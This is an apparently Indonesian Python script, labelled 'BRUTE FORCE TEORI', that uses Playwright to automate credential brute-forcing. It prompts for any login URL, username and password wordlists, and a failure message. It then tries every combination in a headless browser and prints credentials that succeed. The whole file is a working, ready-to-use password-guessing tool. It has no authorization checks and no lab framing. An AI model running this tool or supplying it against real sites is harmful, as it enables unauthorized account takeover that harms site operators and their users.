import os
import platform
import signal
import sys
from playwright.sync_api import sync_playwright
from colorama import init, Fore

# Inisialisasi colorama
init()

# Fungsi untuk membersihkan layar
def clear_screen():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")


def estimasi_waktu(jumlah_baris, waktu_per_kombinasi=3):
    total_detik = jumlah_baris * waktu_per_kombinasi

    hari = total_detik // 86400
    sisa_detik = total_detik % 86400
    jam = sisa_detik // 3600
    sisa_detik %= 3600
    menit = sisa_detik // 60
    detik = sisa_detik % 60
    return f"{hari} hari, {jam} jam, {menit} menit, {detik} detik"



# Fungsi untuk mencoba login
def try_login(page, auth_url, username, password, username_field='username', password_field='password'):
    page.goto(auth_url)
    page.fill(f'input[name="{username_field}"]', username)
    page.fill(f'input[name="{password_field}"]', password)
    page.click('button[type="submit"]')  # Asumsi tombol submit adalah button[type="submit"]
    page.wait_for_load_state('networkidle')  # Tunggu hingga load selesai
    return page.content()

# Fungsi untuk membaca wordlist dari file
def read_wordlist(file_path, start_line=0):
    with open(file_path, "r") as file:
        return [line.strip() for i, line in enumerate(file) if i >= start_line and line.strip()]

# Fungsi untuk memeriksa apakah input adalah file atau string
def check_input(input_value, start_line=0):
    if os.path.isfile(input_value) and input_value.endswith(".txt"):
        return read_wordlist(input_value, start_line)
    else:
        return [input_value]

# Fungsi untuk menampilkan progress
def display_progress(current, total, username, password):
    clear_screen()

    print(Fore.GREEN +
    '''
    ##########################################
    |           * BRUTE FORCE TEORI *        |
    |           *     By Rnuxer-b   *        |
    |           * * * * * * * * * * *        |
    ##########################################
    '''
    + Fore.RESET)
   
    print(Fore.WHITE + f"Selesai pada {estimasi_waktu(total-current,3)}" + Fore.RESET)
    print(Fore.GREEN + f"Mencoba {current} dari {total} kombinasi..." + Fore.RESET)
    print(Fore.CYAN + f"Username: {username}" + Fore.RESET)
    print(Fore.CYAN + f"Password: {password}" + Fore.RESET)

# Fungsi handler untuk sinyal penghentian
def signal_handler(sig, frame):
    print(Fore.RED + "\nProgram dihentikan." + Fore.RESET)
    sys.exit(0)

# Main program
def main():
    # Pasang handler untuk sinyal
    signal.signal(signal.SIGINT, signal_handler)  # Handle Ctrl+C
    signal.signal(signal.SIGTERM, signal_handler)  # Handle termination signal

    clear_screen()

    print(Fore.GREEN +
    '''
    ##########################################
    |           * BRUTE FORCE TEORI *        |
    |           *     By Rnuxer-b   *        |
    |           * * * * * * * * * * *        |
    ##########################################
    '''
    + Fore.RESET)
    # Input URL login
    auth_url = input("[*] URL login target (contoh: https://example.com): ").strip()
    username_input = input("[*] Username atau path ke file wordlist username: ").strip()
    password_input = input("[*] Password atau path ke file wordlist password: ").strip()
    failure_message = input("[*] Pesan yang muncul jika login gagal: ").strip()
    username_field = input("[*] Nama field untuk username pada form login (default: username): ").strip() or 'username'
    password_field = input("[*] Nama field untuk password pada form login (default: password): ").strip() or 'password'

    # Input untuk baris mulai
    username_start_line = int(input("[*] Baris mulai dari wordlist username (default: 0): ").strip() or 0)
    password_start_line = int(input("[*] Baris mulai dari wordlist password (default: 0): ").strip() or 0)

    usernames = check_input(username_input, username_start_line)
    passwords = check_input(password_input, password_start_line)

    # Mengatur ulang attempt_number
    attempt_number = 0

    total_usernames = len(usernames)
    total_passwords = len(passwords)

    # Menggunakan Playwright untuk login
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        for username_index, username in enumerate(usernames, start=0):
            for password_index, password in enumerate(passwords, start=0):
                attempt_number += 1
                display_progress(attempt_number, total_usernames * total_passwords, username, password)
                response_content = try_login(page, auth_url, username, password, username_field, password_field)
                if failure_message not in response_content:

                    clear_screen()
                    print(Fore.BLUE +
                    '''
                    ##########################################
                    |           * SELAMAT.....!!!! *         |
                    |           *  Anda berhasil   *         |
                        Username: {username}         
                        Password: {password}         
                    ##########################################
                    '''
                    .format(username=username, password=password)
                    + Fore.RESET)
                    print(Fore.GREEN + f"Password ditemukan: {password} untuk username: {username}" + Fore.RESET)
                    browser.close()
                    exit()
                else:
                    print(Fore.RED + f"Mencoba username: {username}, password: {password} - Gagal" + Fore.RESET)
        
        browser.close()

    print(Fore.YELLOW + "Brute force selesai, tidak ada kombinasi yang berhasil." + Fore.RESET)

if __name__ == "__main__":
    main()
